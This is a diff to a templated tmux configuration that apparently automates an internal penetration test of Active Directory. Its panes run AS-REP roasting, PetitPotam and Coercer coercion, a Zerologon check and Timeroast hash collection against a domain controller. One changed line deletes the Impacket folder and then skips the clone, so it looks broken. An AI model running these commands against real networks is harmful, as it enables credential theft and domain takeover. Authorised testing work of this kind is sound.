@@ -80,26 +80,25 @@ windows:
       panes:
         - ASREP roast:
           - tmux select-pane -T 'ASREP roast' -t "unauthd:ASREProast.0"
-          - git clone https://github.com/fortra/impacket.git /opt/nomad-tools/latest-Impacket 
-          - docker build -t "impacket:latest" /opt/nomad-tools/latest-Impacket
-          - docker run -it -v /RSM/:/RSM --rm "impacket:latest"
+          - rm -rf /opt/nomad-tools/impacket || git clone https://github.com/fortra/impacket.git /opt/nomad-tools/impacket 
+          - docker build -t "impacket:latest" /opt/nomad-tools/impacket
+          - docker run -it --name newest_impacket -v /RSM/:/RSM --rm "impacket:latest"
           - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile <%= @settings["rootDir"] %>/usernames.txt -outputfile <%= @settings["rootDir"] %>/scans/unauthd-asrepRoast.txt -format john'; clear
   - coercAuth: 
       layout: 786e,113x25,0,0[113x10,0,0,23,113x14,0,11{56x14,0,11,37,56x14,57,11,41}]
       panes:
         - cme petit:
           - tmux select-pane -T 'cme petit' -t "authd:coercAuth.0"
-          - git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam
           - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '' -p '' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam-unauthd.txt
         - PetitPotam.py:
           - tmux select-pane -T 'PetitPotam.py' -t "authd:coercAuth.1"
-          - rm -rf /opt/nomad-tools/PetitPotam && git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam
+          - cd /opt/nomad-tools/PetitPotam || (git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam)
           - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
           - python3 PetitPotam.py -u '' -p '' -d <%= @settings["domain"] %> $nomadIP $(cat /RSM/dcIP.txt | head -n 1)
           - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
         - Coercer:
           - tmux select-pane -T 'Coercer' -t "authd:coercAuth.2"
-          - rm -rf /opt/nomad-tools/Coercer && git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer && cd /opt/nomad-tools/Coercer && pipenv install
+          - cd /opt/nomad-tools/Coercer || (git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer && cd /opt/nomad-tools/Coercer && pipenv install)
           - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
           - pipenv run python3 Coercer.py coerce -l $nomadIP -t $(cat /RSM/dcIP.txt | head -n 1) -u "" -p "" -d <%= @settings["domain"] %> -v
           - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
@@ -107,7 +106,7 @@ windows:
       panes:
         - zerologon:
           - tmux select-pane -T 'zerologon' -t "unauthd:bigName.0"
-          - git clone https://github.com/SecuraBV/CVE-2020-1472.git /opt/nomad-tools && cd /opt/nomad-tools/CVE-2020-1472/ && pipenv install 
+          - cd /opt/nomad-tools/CVE-2020-1472 || (git clone https://github.com/SecuraBV/CVE-2020-1472.git /opt/nomad-tools && cd /opt/nomad-tools/CVE-2020-1472/ && pipenv install)
           - dig any _kerberos._tcp.<%= @settings["domain"] %>
           - <%= @settings["prefill"] %> 'pipenv run zerologon_tester.py $DC-netbiosName $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/zerologon.txt'; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
         - blueKeep:
@@ -120,7 +119,7 @@ windows:
       panes:
         - ldapSigning:
           - tmux select-pane -T 'ldapSigning' -t "unauthd:ldapSigning.0"
-          - git clone https://github.com/zyn3rgy/LdapRelayScan.git /opt/nomad-tools/LdapRelayScan
+          - cd /opt/nomad-tools/LdapRelayScan || git clone https://github.com/zyn3rgy/LdapRelayScan.git /opt/nomad-tools/LdapRelayScan
           # have to modify the requirements.txt due to issue tracked in ldaprelayscan with libcrypto here: https://github.com/zyn3rgy/LdapRelayScan/issues/21
           - cd /opt/nomad-tools/LdapRelayScan && echo "git+https://github.com/wbond/oscrypto.git@d5f3437" >> requirements.txt; pipenv run pip install -r requirements.txt --force-reinstall
           # have to set pipenv install to --skip-lock due to dependency issue
@@ -130,7 +129,7 @@ windows:
       panes:
         - timeroast:
           - tmux select-pane -T 'timeroast' -t "unauthd:timeroast.0"
-          - git clone https://github.com/SecuraBV/Timeroast.git /opt/nomad-tools/Timeroast
+          - cd /opt/nomad-tools/Timeroast || git clone https://github.com/SecuraBV/Timeroast.git /opt/nomad-tools/Timeroast
           - cd /opt/nomad-tools/Timeroast && mkdir -p <%= @settings["rootDir"] %>/loot/timeroast
           - echo <%= @settings["nomadPass"] %> | sudo -S su; clear
           - sudo python3 timeroast.py $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/loot/timeroast/timeroast-ntp-hashes.txt
